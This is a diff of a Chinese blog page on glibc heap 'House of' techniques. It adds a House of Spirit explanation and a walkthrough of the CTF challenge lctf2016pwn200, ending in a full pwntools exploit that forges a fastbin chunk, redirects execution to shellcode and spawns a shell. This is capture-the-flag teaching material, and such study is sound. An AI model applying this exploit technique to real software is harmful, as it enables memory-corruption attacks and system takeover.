@@ -12,7 +12,7 @@
   <meta name="google" content="notranslate" />
   
   <meta name="description" content=" 该系列内容较多，将会在较长时间持续更新
-house ...">
+House ...">
   <meta name="author" content="ShouCheng">
   <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
   <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
@@ -196,16 +196,43 @@ house ...">
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>July 27, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>276</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2727</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
         <p> 该系列内容较多，将会在较长时间持续更新</p>
-<h2 id="house-of-Roman"><a href="#house-of-Roman" class="headerlink" title="house of Roman"></a>house of Roman</h2><p>这个方法太过局限，就不介绍，只是留个名字</p>
+<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>这个方法太过局限，就不介绍，只是留个名字</p>
 <h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>技术来源：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p>
 <p>House of Spirit（下面称为hos）算是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。</p>
+<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p>
+<p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下</p>
+<p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">http://p7.qhimg.com/t01c4e1f8669a8b77bd.png</span></p>
+<p>（2）存在可将堆变量指针覆盖为指向可控区域，即上一步中的区域</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>（1）伪造堆块，在可控1及可控2构造好数据，将它伪造成一个fast chunk。</p>
+<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
+<p>（3）释放堆块，将伪造的堆块释放入fast bin里面。</p>
+<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p>
+<p>第一步中的伪造堆块的过程，fastbin是一个单链表结构，遵循FIFO的规则，32位系统中fastbin的大小是在16<del>64字节之间，64位是在32</del>128字节之间。释放时会进行一些检查，所以需要对伪堆块中的数据进行构造，使其顺利的释放进到fastbin里面</p>
+<h3 id="例题lctf2016pwn200"><a href="#例题lctf2016pwn200" class="headerlink" title="例题lctf2016pwn200"></a>例题lctf2016pwn200</h3><p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210905204052044</span></p>
+<p>常规checksec一下，保护基本没开。</p>
+<p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210905204120841</span></p>
+<p>这里的输入存在漏洞，填满可以泄露出rsp上的值，获得栈上地址</p>
+<p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">http://p8.qhimg.com/t01eb7870c8fa4fde39.png</span></p>
+<p>目标地址的构造为上图所示，在money中输入的是伪堆块的size，在id里输入的是下一个堆块的size，以此绕过free释放堆块时候系统的检查</p>
+<p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210905204549591</span></p>
+<p>然后就是：</p>
+<p>（1）覆盖堆指针，在输入money的时候，会覆盖堆块。</p>
+<p>（2）调用free函数将伪堆块释放到fastbin中</p>
+<p>（3）申请堆块，将刚刚的伪堆块申请出来</p>
+<p>（4）输入数据，即可修改目标区域，eip，使其指向shellcode</p>
+<p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210905230703667</span></p>
+<p>这是构造出来的fake_chunk，后面就是要把这块释放了，然后再申请回来，把0x400b34这个地址覆盖为shellcode，即可在退出程序时返回到shellcode去执行</p>
+<p><img   class="lazyload" data-original="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210905212358111</span></p>
+<p>getshell！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 
       </section>
       <section class="extra">
@@ -245,7 +272,7 @@ house ...">
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-Roman"><span class="toc-text">house of Roman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Orange"><span class="toc-text">House of Orange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Spirit"><span class="toc-text">House of Spirit</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Roman"><span class="toc-text">House of Roman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Orange"><span class="toc-text">House of Orange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Spirit"><span class="toc-text">House of Spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98lctf2016pwn200"><span class="toc-text">例题lctf2016pwn200</span></a></li></ol></li></ol>
   </aside>
 
         
